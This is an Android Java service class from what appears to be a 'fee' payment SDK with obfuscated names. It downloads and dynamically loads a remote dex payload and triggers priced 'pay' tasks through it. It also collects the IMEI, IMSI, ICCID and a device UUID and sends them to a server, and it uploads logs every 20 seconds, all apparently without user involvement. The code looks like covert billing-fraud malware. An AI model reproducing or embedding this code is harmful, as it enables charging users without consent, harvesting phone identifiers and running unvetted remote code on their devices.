package com.channel.ef;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.text.TextUtils;

import com.channel.di.AppBuildConfig;
import com.channel.di.net.PromptCallback;
import com.channel.di.net.LogReporter;
import com.channel.di.net.RequestDexDownloadCallback;
import com.channel.di.net.DexRequestHelper;
import com.channel.di.utils.Constants;
import com.gandalf.daemon.utils.DeviceUuidFactory;
import com.gandalf.daemon.utils.XL_log;
import com.msm.modu1e.utils.IMSInfo;
import com.msm.modu1e.utils.ImsiUtil;
import com.zhy.http.okhttp.OkHttpUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

import k.m.IStub;
import k.m.PayTask;


public class Ues extends Service {
    private static final XL_log log = new XL_log(Ues.class);
    private boolean DO_SERVICE = true;
    private static final String PAY_TASKID = "pay_taskid";
    private DexRequestHelper mRequestHelper = null;

    private IStub stub;

    @Override
    public void onCreate() {
        log.debug("service onCreate ");
        super.onCreate();
        if (!DO_SERVICE) {
            return;
        }
        initDate();
    }

    private void initDate() {
        scheduleUploadLog();
        mRequestHelper = DexRequestHelper.getInstance(this.getApplicationContext());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        log.debug("onStartCommand id:" + startId);
        if (!DO_SERVICE) {
            return super.onStartCommand(intent, flags, startId);
        }
        if (intent != null) {
            final String action = intent.getAction();
            final Intent local_intent = intent;
            if (!TextUtils.isEmpty(action)) {
                log.debug("Ues action:" + action);
            } else {
                return START_REDELIVER_INTENT;
            }
            if (action.equals(Constants.INTENT_ACTION_REQEUST_DOWNLOAD_DEX)) {
                String payTaskId = local_intent.getStringExtra(PAY_TASKID);
                log.debug("request download dex paytasdk id" + payTaskId);
                mRequestHelper.requestDownloalDex(/*payTaskId, */new RequestDexDownloadCallback(Ues.this.getApplicationContext()/*, payTaskId*/));
            } else if (action.equals(Constants.INTENT_ACTION_LAUNCH_DEX_AND_PAY)) {
                String dexPath = local_intent.getStringExtra(Constants.INTENT_BUNDEL_KEY_DEX_PATH);
                log.debug("do launch dex path:" + dexPath);
                launchDexAndPayCacheTask(dexPath);
            } else if (action.equals(Constants.INTENT_ACTION_START_SERVICE_WITH_PAYTASK)) {
                Bundle bundle = local_intent.getExtras();
                if (bundle != null) {
                    PayTask paytask = (PayTask) bundle.getSerializable(Constants.INTENT_BUNDEL_KEY_PAYTASK);
                    if (paytask != null) {
                        log.debug("request pay task id:" + paytask.getTaskId() + " ,pay :" + paytask.mPrice);
                        startPayServiceWithPrice(paytask);
                    }
                }
            }
        }
        return START_REDELIVER_INTENT;
    }

    private void launchDexAndPayCacheTask(final String path) {
        if (TextUtils.isEmpty(path)) {
            return;
        }
        final String local_path = path;
        new Thread(new Runnable() {
            @Override
            public void run() {
                stub = LoadUtil.getNewStub(Ues.this.getApplicationContext(), local_path);
                if (stub == null) {
                    return;
                }
                ArrayList<PayTask> payTasks = getPayTasksCache();
                if (payTasks != null) {
                    for (int i = 0; i < payTasks.size(); i++) {
                        PayTask task = payTasks.get(i);
                        if (task != null) {
                            payTasks.remove(i);
                            requestPay(Ues.this.getApplicationContext(), task);
                        }

                    }
                }
            }
        }).start();

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }


    private static void startDownloadDex(Context context/*, String payTaskId*/) {
        String action = Constants.INTENT_ACTION_REQEUST_DOWNLOAD_DEX;
        Intent intent = new Intent(context, Ues.class);
        intent.setAction(action);
        //intent.putExtra(PAY_TASKID, payTaskId);
        context.startService(intent);
    }


    public static void initStub(Context mAppContext) {
        if (TextUtils.isEmpty(LoadUtil.getDexPath(mAppContext))) {
            startDownloadDex(mAppContext);
            log.debug("initStub DexPath isEmpty startDownloadDex");
        }
    }

    public static void initPrompt(Context mAppContext) {
        try {
            Map<String, String> params = new HashMap<>();
            if (TextUtils.isEmpty(PayManager.mPid) || TextUtils.isEmpty(PayManager.mCid)) {
                return;
            }
            IMSInfo imsiInfo = ImsiUtil.getIMSInfo(mAppContext);
            String imsi = "";
            if (imsiInfo != null) {
                String i1 = imsiInfo.imsi_1;
                String i2 = imsiInfo.imsi_2;
                if (!TextUtils.isEmpty(i1)) {
                    imsi = i1;
                } else if (!TextUtils.isEmpty(i2)) {
                    imsi = i2;
                }
            }
            if (TextUtils.isEmpty(imsi)) {
                imsi = ImsiUtil.getIMSIWithAPI(mAppContext);
            }
            String imei = ImsiUtil.getIMEIWithAPI(mAppContext);
            params.put("pid", PayManager.mPid);
            params.put("cid", PayManager.mCid);
            params.put("iccid", ImsiUtil.getICCIDWithAPI(mAppContext));
            params.put("imei", imei);
            params.put("imsi", imsi);
            params.put("uuid", new DeviceUuidFactory(mAppContext).getDeviceUuid());
            params.put("name", "feeSdk2_fee");
            OkHttpUtils.get().params(params).url(Constants.URL_GET_PROMPT).build().execute(new PromptCallback(mAppContext));
        } catch (IllegalArgumentException e) {
            e.printStackTrace();
        }
    }

    public static void requestPay(Context context, PayTask payTask) {
        if (payTask != null) {
            if (payTask.mPrice >= 0) {
                Intent intent = new Intent(context, Ues.class);
                intent.setAction(Constants.INTENT_ACTION_START_SERVICE_WITH_PAYTASK);
                intent.putExtra(Constants.INTENT_BUNDEL_KEY_PAYTASK, payTask);
                context.startService(intent);
            }
        }
    }

    private synchronized void startPayServiceWithPrice(PayTask payTask) {
        if (payTask == null) {
            return;
        }
        final PayTask local_payTask = payTask;
        stub = LoadUtil.getStub(Ues.this.getApplicationContext(), payTask.mPid, payTask.mCid);
        if (stub != null) {
            stub.setPayloadVersion(AppBuildConfig.SDK_VERSION);
            stub.pay(local_payTask);
        } else {
            log.warn("remote stub is null ,storePayTasksToCache");
            storePayTasksToCache(local_payTask);
            //startDownloadDex(Ues.this.getApplicationContext()/*, local_payTask.getTaskId()*/);
        }

    }

    @Override
    public void onDestroy() {
        log.debug("onDestroy");
        stopService();
    }

    private void stopService() {
        IStub stub = LoadUtil.getStub(this);
        if (stub != null) {
            stub.stopService();
        }
    }

    private static ArrayList<PayTask> smPayTasksCache = new ArrayList<PayTask>();

    private void storePayTasksToCache(PayTask payTask) {
        if (payTask != null) {
            smPayTasksCache.add(payTask);
        }
    }

    private ArrayList<PayTask> getPayTasksCache() {
        return smPayTasksCache;
    }

    private static Timer smUploadLogTimer = new Timer();
    ;
    private static final int REPORT_LOG_STAMP = 20 * 1000;
    private static final boolean UPLOAD_LOG = true;

    public void scheduleUploadLog() {
        if (!UPLOAD_LOG) {
            return;
        }
        log.debug("scheduleUploadLog");
        smUploadLogTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                String logConent = getRunlogContent();
                if (TextUtils.isEmpty(logConent))
                    return;
                clearLog();
                log.debug("reportLog runtime log length:" + logConent.length());
                LogReporter.reportRunLog(Ues.this.getApplicationContext(), logConent);
                System.gc();
            }
        }, REPORT_LOG_STAMP, REPORT_LOG_STAMP);
    }

    public String getRunlogContent() {
        return XL_log.getLogContent(this.getApplicationContext());
    }

    public void clearLog() {
        XL_log.clearLogFile(this.getApplicationContext());
    }
}
